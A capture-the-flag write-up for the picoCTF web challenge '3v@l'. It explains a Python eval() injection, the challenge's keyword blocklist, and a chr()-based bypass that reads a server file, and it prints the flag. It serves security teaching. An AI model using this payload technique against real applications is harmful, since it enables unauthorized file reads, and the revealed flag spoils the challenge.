# `3v@l` — CTF Write-up

# 3v@l

> **Category:** Web Exploitation  
> **Difficulty:** Medium  
> **Platform:** CyLab Security Academy / picoCTF  
> **Challenge:** 3v@l  
> **Vulnerability:** Python `eval()` Injection / Remote Code Execution  
> **Impact:** Arbitrary Python expression execution and arbitrary file read

---

## 1. Challenge Description

ABC Bank provides a loan calculator that allows users to enter a formula.

The challenge description states that the application uses Python's `eval()` function to calculate the loan.

The objective is to bypass the application's filtering mechanism, exploit the unsafe `eval()` usage, and read the flag.

---

## 2. Initial Application

The application presents a simple loan calculator:

```text
Bank-Loan Calculator

Enter the formula:

[                                  ]

              Execute
```

The form submits the supplied formula to the server.

The important observation is that the user controls the expression being evaluated.

---

## 3. Source Code / Developer Clue

Inspecting the HTML/source revealed a useful developer comment.

The application attempted to secure the Python `eval()` execution by:

1. Blocking dangerous keywords such as:

```text
os
eval
exec
bind
connect
python
socket
ls
cat
shell
```

2. Using a regular expression to block additional potentially dangerous syntax.

This immediately suggested that the application was using a **blacklist-based security mechanism** around `eval()`.

---

# 4. Understanding the Vulnerability

The dangerous design can be simplified to:

```python
result = eval(user_input)
```

If `user_input` is controlled by an attacker, the attacker is not simply entering a mathematical formula.

They are supplying a Python expression.

For example:

```python
1 + 1
```

is evaluated by Python as:

```text
2
```

Therefore:

```text
User input
     |
     v
   eval()
     |
     v
Python interpreter
```

The attacker effectively gets access to Python's expression evaluation environment.

---

# 5. Testing the Calculator

Before attempting exploitation, we tested basic expressions.

### Test 1

```python
1
```

The expression was accepted.

### Test 2

```python
1+1
```

The expression was accepted and evaluated.

### Test 3

```python
'hello'
```

The expression was also accepted.

This confirmed that arbitrary Python expressions were being evaluated.

---

# 6. Testing Python Built-ins

The next question was:

> What Python functionality is still available despite the blacklist?

We tested:

```python
open
```

The application did not report the `open` keyword as forbidden.

This was an important discovery.

The blacklist contained many dangerous functions/modules:

```text
os
eval
exec
socket
cat
ls
shell
```

but `open` was not blocked.

Therefore we potentially had a file-reading primitive.

---

# 7. Attempting to Read the Flag

The obvious test was:

```python
open('/flag.txt').read()
```

However, the application's filter rejected the expression with:

```text
Error: Detected forbidden keyword ''
```

This was interesting.

The problem was not necessarily `open`.

The filter was detecting syntax inside the argument/path.

---

# 8. Understanding the Filter Bypass

Instead of writing special characters directly, Python allows us to construct them dynamically.

For example:

```python
chr(47)
```

returns:

```text
/
```

And:

```python
chr(46)
```

returns:

```text
.
```

Therefore:

```python
chr(47)+'flag'+chr(46)+'txt'
```

constructs:

```text
/flag.txt
```

without directly writing the `/` and `.` characters.

This demonstrates an important security concept:

> A blacklist that blocks specific representations of dangerous input is not a reliable security boundary.

---

# 9. Final Exploit

The file path was constructed dynamically:

```python
chr(47)+'flag'+chr(46)+'txt'
```

This produced:

```text
/flag.txt
```

Because `open()` was still available, the file could then be read using:

```python
open(chr(47)+'flag'+chr(46)+'txt').read()
```

The application returned the flag.

---

# 10. Flag

```text
academy{D0nt_Use_Unsecure_f@nctionsfcf3878f}
```

---

# 11. Exploitation Chain

The complete attack can be represented as:

```text
                    USER INPUT
                        |
                        v
                Loan Calculator
                        |
                        v
                 Python eval()
                        |
                        v
             Attacker-controlled
                 expression
                        |
                        v
                    open()
                        |
                        v
               /flag.txt
                        |
                        v
                    .read()
                        |
                        v
                      FLAG
```

---

# 12. Why the Blacklist Failed

The developer attempted to block dangerous functionality using a blacklist.

For example:

```text
Blocked:
    os
    eval
    exec
    socket
    ls
    cat
    shell
```

But security does not work reliably this way.

There are usually many different ways to reach the same functionality.

In this challenge:

```text
Literal path
     |
     | blocked by filter
     v
'/flag.txt'

Alternative representation
     |
     v
chr(47)+'flag'+chr(46)+'txt'
     |
     v
/flag.txt
```

The application checked the **representation of the input**, rather than securely preventing dangerous operations.

---

# 13. The Core Vulnerability

The fundamental vulnerability was NOT the blacklist.

The fundamental vulnerability was:

```python
eval(user_input)
```

The blacklist was only an attempted mitigation.

Once attacker-controlled data reaches `eval()`, the application is effectively allowing the attacker to interact with the Python interpreter.

---

# 14. Why `eval()`(eval() takes a string containing a Python expression and asks Python to evaluate it.) Is Dangerous

Consider:

```python
formula = request.form["formula"]

result = eval(formula)
```

The developer may expect the user to submit:

```python
10000 * 0.05
```

But Python doesn't know that the user is "supposed" to perform mathematics.

It simply evaluates the expression.

Therefore the input should never be treated as trusted.

---

# 15. Why Blacklists Are Weak

A blacklist might attempt to block:

```text
os
exec
eval
open
system
```

But Python has a huge runtime environment and many alternative ways to access functionality.

Attackers can often use:

- alternative APIs
- object attributes
- built-ins
- string construction
- encoding
- indirect references
- Python object relationships

Therefore:

```text
"Block bad words"
```

is not equivalent to:

```text
"Make the application secure"
```

---

# 16. Better Solution

If the application only needs mathematical calculations, it should NOT execute arbitrary Python.

Instead, the application should implement a restricted expression parser.

For example, an application could accept:

```text
10000 * 0.05
```

and only permit:

```text
numbers
+
-
*
/
(
)
```

A safe mathematical expression evaluator should parse the expression and allow only explicitly supported operations.

---

# 17. Secure Design Principle

Never do this with user-controlled input:

```python
eval(user_input)
```

or:

```python
exec(user_input)
```

unless the input is completely trusted and the execution environment is deliberately isolated.

For a calculator, use a dedicated mathematical parser instead.

---

# 18. Methodology Learned

This challenge demonstrated a useful web exploitation workflow:

```text
1. Inspect the application
       ↓
2. Identify the input point
       ↓
3. Look at source/comments
       ↓
4. Identify dangerous server-side functionality
       ↓
5. Test harmless expressions
       ↓
6. Determine what functionality is available
       ↓
7. Identify useful primitives
       ↓
8. Study the filtering mechanism
       ↓
9. Find an alternative representation
       ↓
10. Construct the exploit
       ↓
11. Read the flag
```

---

# 19. Important CTF Thinking

The most important lesson from this challenge is:

> **Don't immediately search for a payload. First understand what the application is actually doing.**

We started with:

```text
What happens if I submit 1?
```

Then:

```text
Does Python expression evaluation happen?
```

Then:

```text
What functionality is available?
```

Then:

```text
Is open() available?
```

Then:

```text
What is the filter blocking?
```

Then:

```text
Can I represent the same value differently?
```

This is much more useful than memorizing one payload.

# 20. Difference From SSTI

This challenge is closely related to the SSTI challenge we previously solved, but the injection point is different.

### SSTI

```text
User input
    ↓
Template engine
    ↓
Template expression
    ↓
Server-side execution
```

Example:

```text
{{ ... }}
```

### `eval()` Injection

```text
User input
    ↓
Python eval()
    ↓
Python expression
    ↓
Code execution
```

Example:

```python
1+1
```

The important skill is recognizing **where your input reaches an interpreter**.

---

# 21. Final Takeaways

```text
┌────────────────────────────────────────────┐
│             3v@l KEY LESSONS               │
├────────────────────────────────────────────┤
│                                            │
│  eval(user_input) = dangerous              │
│                                            │
│  Blacklists are not reliable security      │
│  boundaries                                │
│                                            │
│  Identify what functionality survives      │
│  the filter                                │
│                                            │
│  Look for useful primitives                │
│                                            │
│  Think about alternate representations     │
│                                            │
│  Understand the vulnerability, not just    │
│  the final payload                         │
│                                            │
└────────────────────────────────────────────┘
```

## Flag

```text
academy{D0nt_Use_Unsecure_f@nctionsfcf3878f}
```

---

## Skills Practiced

- [x] Source-code inspection
- [x] Python `eval()` analysis
- [x] Input filtering analysis
- [x] Blacklist bypass
- [x] Python built-in discovery
- [x] File read primitive
- [x] Server-side code execution concepts
- [x] Web exploitation methodology
```
